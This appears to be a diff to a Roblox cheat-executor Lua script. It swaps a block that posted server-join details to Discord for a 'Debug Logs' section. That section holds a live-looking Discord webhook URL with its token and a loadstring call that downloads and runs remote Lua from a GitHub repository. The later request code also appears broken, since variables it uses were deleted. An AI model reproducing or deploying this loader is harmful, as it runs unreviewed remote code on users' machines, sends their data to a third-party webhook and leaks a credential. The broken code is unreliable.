@@ -92,18 +92,23 @@ task.spawn(
         end
     end
 )
-local _ = {
-    ["embeds"] = {
-        {
-            ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-            ["description"] = "```TP :\n" .. "game:GetService("TeleportService"):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId .. "')" .. "```"
-        }
-    }
-}
-local a = e:JSONEncode(_)
-local b = {
-    ["content-type"] = "application/json"
-}
+getgenv().DebugLogs = true
+if getgenv().DebugLogs then
+getgenv().Title = "```MTX Client | Log System```"
+getgenv().ThumbnailUrl = "https://media.discordapp.net/attachments/1221263080223146124/1221271153029550232/image.png?ex=662da7e5&is=661b32e5&hm=a7f8baa2bc0ccecb49bb7bbe781dd2f43038b9782015100841ea87175397e35a&=&format=webp&quality=lossless&width=550&height=324"
+getgenv().Color = 9765119 -- Purple
+
+getgenv().FieldTitle = ""
+getgenv().FieldText = ""
+
+getgenv().FooterText = "🥋 Powered By MTX-Team 💔"
+getgenv().FooterUrl = "https://media.discordapp.net/attachments/1221263080223146124/1221269995422617670/image.png?ex=662da6d1&is=661b31d1&hm=9ce96559c9cd6e5e421a40e2c75ebbefed3b7e1ece7ecbef46041e153aee6e3b&=&format=webp&quality=lossless&width=554&height=559"
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1230602296434360352/p9JJMFsdoqQ-ot7FWxPLZXiyZu3aZiI7jSYExkhHbOo6KCN9h730tNBFWoAbpK-mzbRQ"
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/MetatronXTryHard/MTX-Team/main/Nexus/Services/Module%20%232.lua"))()
+end)()
+end
 local _ = http_request or request or HttpPost or syn.request
 local a = {Url = getgenv().service, Body = a, Method = "POST", Headers = b}
 if c() then
